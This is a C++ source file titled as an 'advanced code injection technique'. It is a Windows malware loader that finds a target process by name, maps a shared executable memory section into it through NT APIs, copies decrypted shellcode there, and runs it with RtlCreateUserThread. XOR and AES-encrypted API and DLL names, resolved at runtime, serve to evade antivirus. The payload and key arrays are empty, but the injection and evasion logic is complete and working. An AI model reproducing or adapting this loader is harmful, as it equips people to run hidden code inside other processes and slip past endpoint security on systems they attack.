/*
 * peekaboo_nt.cpp
 * advanced code injection technique via NtCreateSection and NtMapViewOfSection
 * author @cocomelonc
*/
#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "advapi32.lib") 

#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

// shellcode 64-bit (encrypted)
unsigned char my_payload[] = { };

// encrypted process name
unsigned char my_proc[] = { };

// encrypted functions
unsigned char s_ntop[] = { };
unsigned char s_p32f[] = { };
unsigned char s_p32n[] = { };
unsigned char s_ct32s[] = { };
unsigned char s_clh[] = { };
unsigned char s_wfso[] = { };

unsigned char s_ntcs[] = { };
unsigned char s_ntmvos[] = { };
unsigned char s_rcut[] = { };
unsigned char s_zw[] = { }; 

// decrypted function names
char func_ntop[14] = "";
char func_clh[12] = "";
char func_ntcs[16] = "";
char func_ntmvos[19] = "";
char func_rcut[20] = "";
char func_zw[21] = "";
char func_wfso[20] = "";

// encrypted DLL names (kernel32.dll, ntdll.dll)
unsigned char s_k32[] = { };
unsigned char s_ntd[] = { };

// length
unsigned int my_payload_len = sizeof(my_payload);
unsigned int my_proc_len = sizeof(my_proc);
unsigned int s_ntop_len = sizeof(s_ntop);
unsigned int s_p32f_len = sizeof(s_p32f);
unsigned int s_p32n_len = sizeof(s_p32n);
unsigned int s_ct32s_len = sizeof(s_ct32s);
unsigned int s_clh_len = sizeof(s_clh);
unsigned int s_wfso_len = sizeof(s_wfso);
unsigned int s_k32_len = sizeof(s_k32);
unsigned int s_ntd_len = sizeof(s_ntd);
unsigned int s_ntcs_len = sizeof(s_ntcs);
unsigned int s_ntmvos_len = sizeof(s_ntmvos);
unsigned int s_rcut_len = sizeof(s_rcut);
unsigned int s_zw_len = sizeof(s_zw);


// keys
char my_payload_key[] = "";
char my_proc_key[] = "";
unsigned char s_ntop_key[] = "";
unsigned char s_ntcs_key[] = "";
unsigned char s_ntmvos_key[] = "";
unsigned char s_rcut_key[] = "";
unsigned char s_zw_key[] = "";
unsigned char s_clh_key[] = "";
unsigned char s_wfso_key[] = "";
char s_p32f_key[] = "";
char s_p32n_key[] = "";
char s_ct32s_key[] = "";
char k32_key[] = "";
char ntd_key[] = "";

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
  USHORT            Length;
  USHORT            MaximumLength;
  PWSTR             Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
  ULONG            Length;
  HANDLE           RootDirectory;
  PUNICODE_STRING  ObjectName;
  ULONG            Attributes;
  PVOID            SecurityDescriptor;
  PVOID            SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
  PVOID            UniqueProcess;
  PVOID            UniqueThread;
} CLIENT_ID, *PCLIENT_ID;


// NtCreateSection syntax
typedef NTSTATUS(NTAPI* pNtCreateSection)(
  OUT PHANDLE            SectionHandle,
  IN ULONG               DesiredAccess,
  IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER      MaximumSize OPTIONAL,
  IN ULONG               PageAttributess,
  IN ULONG               SectionAttributes,
  IN HANDLE              FileHandle OPTIONAL
); 

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
  HANDLE            SectionHandle,
  HANDLE            ProcessHandle,
  PVOID*            BaseAddress,
  ULONG_PTR         ZeroBits,
  SIZE_T            CommitSize,
  PLARGE_INTEGER    SectionOffset,
  PSIZE_T           ViewSize,
  DWORD             InheritDisposition,
  ULONG             AllocationType,
  ULONG             Win32Protect
);

// RtlCreateUserThread syntax
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
  IN HANDLE               ProcessHandle,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
  IN BOOLEAN              CreateSuspended,
  IN ULONG                StackZeroBits,
  IN OUT PULONG           StackReserved,
  IN OUT PULONG           StackCommit,
  IN PVOID                StartAddress,
  IN PVOID                StartParameter OPTIONAL,
  OUT PHANDLE             ThreadHandle,
  OUT PCLIENT_ID          ClientID
);

// NtOpenProcess syntax
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
  PHANDLE                 ProcessHandle,
  ACCESS_MASK             AccessMask,
  POBJECT_ATTRIBUTES      ObjectAttributes,
  PCLIENT_ID              ClientID
);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
  HANDLE                 ProcessHandle,
  PVOID BaseAddress
);

BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

// decryption
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
      data[i] = data[i] ^ key[j];
      j++;
  }
}

// AES decrypt
int AESDecrypt(char * data, unsigned int data_len, char * key, size_t keylen) {
  HCRYPTPROV hProv;
  HCRYPTHASH hHash;
  HCRYPTKEY hKey;

  if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
    return -1;
  }
  if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
    return -1;
  }
  if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
    return -1;
  }
  if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
    return -1;
  }
  if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, data, &data_len)){
    return -1;
  }

  CryptReleaseContext(hProv, 0);
  CryptDestroyHash(hHash);
  CryptDestroyKey(hKey);

  return 0;
}


// get process PID
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  XOR((char *) s_p32f, s_p32f_len, s_p32f_key, sizeof(s_p32f_key));
  pProcess32First = GetProcAddress(GetModuleHandle(s_k32), s_p32f);

  XOR((char *) s_p32n, s_p32n_len, s_p32n_key, sizeof(s_p32n_key));
  pProcess32Next = GetProcAddress(GetModuleHandle(s_k32), s_p32n);

  XOR((char *) s_ct32s, s_ct32s_len, s_ct32s_key, sizeof(s_ct32s_key));
  pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(s_k32), s_ct32s);

  // snapshot of all processes in the system
  hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = pProcess32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = pProcess32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  pCloseHandle(hSnapshot);
  return pid;
}

// int main(int argc, char* argv[]) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

  SIZE_T s = 4096;
  LARGE_INTEGER sectionS = { s };
  HANDLE sh = NULL; // section handle
  PVOID lb = NULL; // local buffer
  PVOID rb = NULL; // remote buffer
  HANDLE th = NULL; // thread handle
  DWORD pid; // process ID
  
  // decrypt kernel32.dll
  XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));
  
  // decrypt CloseHandle
  //XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
  AESDecrypt((char *)s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
  snprintf(func_clh, sizeof(func_clh), "%s", s_clh);
  pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), func_clh);
  // printf("CloseHandle: %s\n", (char *)func_clh);

  //pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), s_clh);

  // decrypt process name
  XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));
  
  // printf("process; %s\n", (char *) my_proc);
  pid = findMyProc(my_proc);
  // printf("PID: %d\n", pid);
  
  OBJECT_ATTRIBUTES oa;
  CLIENT_ID cid;
  InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
  cid.UniqueProcess = (PVOID) pid;
  cid.UniqueThread = 0;

  // decrypt ntdll.dll
  XOR((char *) s_ntd, s_ntd_len, ntd_key, sizeof(ntd_key));

  // decrypt NtOpenProcess
  // XOR((char *) s_ntop, s_ntop_len, s_ntop_key, sizeof(s_ntop_key));

  AESDecrypt((char *)s_ntop, s_ntop_len, s_ntop_key, sizeof(s_ntop_key));
  snprintf(func_ntop, sizeof(func_ntop), "%s", s_ntop);

  // decrypt NtCreateSection
  // XOR((char *) s_ntcs, s_ntcs_len, s_ntcs_key, sizeof(s_ntcs_key));
  AESDecrypt((char *)s_ntcs, s_ntcs_len, s_ntcs_key, sizeof(s_ntcs_key));
  snprintf(func_ntcs, sizeof(func_ntcs), "%s", s_ntcs);

  // decrypt NtMapViewOfSection
  // XOR((char *) s_ntmvos, s_ntmvos_len, s_ntmvos_key, sizeof(s_ntmvos_key));
  AESDecrypt((char *)s_ntmvos, s_ntmvos_len, s_ntmvos_key, sizeof(s_ntmvos_key));
  snprintf(func_ntmvos, sizeof(func_ntmvos), "%s", s_ntmvos);
  
  // RtlCreateUserThread
  // XOR((char *) s_rcut, s_rcut_len, s_rcut_key, sizeof(s_rcut_key));
  AESDecrypt((char *)s_rcut, s_rcut_len, s_rcut_key, sizeof(s_rcut_key));
  snprintf(func_rcut, sizeof(func_rcut), "%s", s_rcut);

  // decrypt ZwUnmapViewOfSection
  // XOR((char *) s_zw, s_zw_len, s_zw_key, sizeof(s_zw_key));
  AESDecrypt((char *)s_zw, s_zw_len, s_zw_key, sizeof(s_zw_key));
  snprintf(func_zw, sizeof(func_zw), "%s", s_zw);

  // loading ntdll.dll
  HANDLE ntdll = GetModuleHandle(s_ntd);

  /*
  printf("NTOP: %s\n", (char *)s_ntop);
  printf("NTCS: %s\n", (char *)s_ntcs);
  printf("NTMVOS: %s\n", (char *)s_ntmvos);
  printf("RCUT: %s\n", (char *)s_rcut);
  printf("ZW: %s\n", (char *)s_zw);
  */
  
  /*
  printf("NTOP: %s\n", (char *)func_ntop);
  printf("NTCS: %s\n", (char *)func_ntcs);
  printf("NTMVOS: %s\n", (char *)func_ntmvos);
  printf("RCUT: %s\n", (char *)func_rcut);
  printf("ZW: %s\n", (char *)func_zw);
  printf("CloseHandle: %s\n", (char *)func_clh);
  */

  /*
  pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, s_ntop);
  pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress(ntdll, s_ntcs));
  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, s_ntmvos));
  pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(ntdll, s_rcut));
  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, s_zw));
  */ 

  pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, func_ntop);
  pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress(ntdll, func_ntcs));
  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, func_ntmvos));
  pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(ntdll, func_rcut));
  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, func_zw));

  // create a memory section
  myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

  // bind the object in the memory of our process for reading and writing
  myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_READWRITE);

  // open remote proces via NT API
  HANDLE ph = NULL;
  myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);
  
  if (!ph) {
    printf("failed to open process :(\n");
    return -2;
  }
  
  // bind the object in the memory of the target process for reading and executing
  myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ);

  // decrypt payload
  XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));

  // write payload
  memcpy(lb, my_payload, sizeof(my_payload));

  //printf("current = %p\n", lb);
  //printf("target = %p\n", rb);

  // create a thread
  myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL);

  // decrypt WaitForSingleObject function call
  // XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
  // pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), s_wfso);
  
  AESDecrypt((char *)s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
  snprintf(func_wfso, sizeof(func_wfso), "%s", s_wfso);
  pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), func_wfso);
  // printf("WFSO: %s\n", (char *)func_wfso);


  // and wait
  if (pWaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
    return -2;
  }
  
  // clean up
  myZwUnmapViewOfSection(GetCurrentProcess(), lb);
  myZwUnmapViewOfSection(ph, rb);
  pCloseHandle(sh);
  pCloseHandle(ph);
  return 0;
}
